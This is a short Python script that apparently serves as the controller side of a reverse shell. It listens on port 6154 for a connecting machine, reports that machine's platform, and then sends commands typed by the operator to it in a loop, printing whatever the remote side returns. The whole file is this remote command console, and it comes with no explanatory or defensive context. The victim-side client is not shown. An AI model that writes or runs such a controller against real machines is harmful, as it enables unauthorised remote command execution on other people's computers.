import socket
import os

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 6154

BUFFER_SIZE = 5120

s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected! \n")

platform = client_socket.recv(BUFFER_SIZE).decode()
print(f"Seems to be a {platform} machine")

while True:
    command = input("Enter the command you wanna execute:")
    client_socket.send(command.encode())
    if command.lower() == 'cls':
        os.system("cls")
    elif command.lower() == "exit":
        break
    results = client_socket.recv(BUFFER_SIZE+200).decode()
    print(results)

client_socket.close()
s.close()
